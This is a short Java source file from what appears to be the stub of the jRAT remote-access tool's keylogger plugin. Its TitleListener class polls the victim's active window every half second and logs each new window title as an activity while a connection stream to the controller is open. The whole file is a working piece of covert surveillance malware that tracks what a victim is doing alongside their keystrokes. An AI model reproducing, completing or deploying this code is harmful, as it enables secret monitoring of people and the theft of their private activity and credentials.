package se.jrat.plugin.keylogger.stub;

import nativewindowlib.NativeWindow;
import nativewindowlib.WindowUtils;
import se.jrat.plugin.keylogger.stub.activities.Activities;
import se.jrat.plugin.keylogger.stub.activities.Title;

public class TitleListener implements Runnable {

	private static String latest;

	@Override
	public void run() {
		try {
			Thread.sleep(1000L);
			
			while (true) {
				if (KeyloggerPlugin.dos != null) {					
					NativeWindow window = WindowUtils.getActiveWindow();
					
					String title = window.getTitle();
					
					if (latest == null || latest != null && !title.equals(latest)) {
						Activities.add(new Title(title));
					}
					
					latest = title;				
				}
				Thread.sleep(500L);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
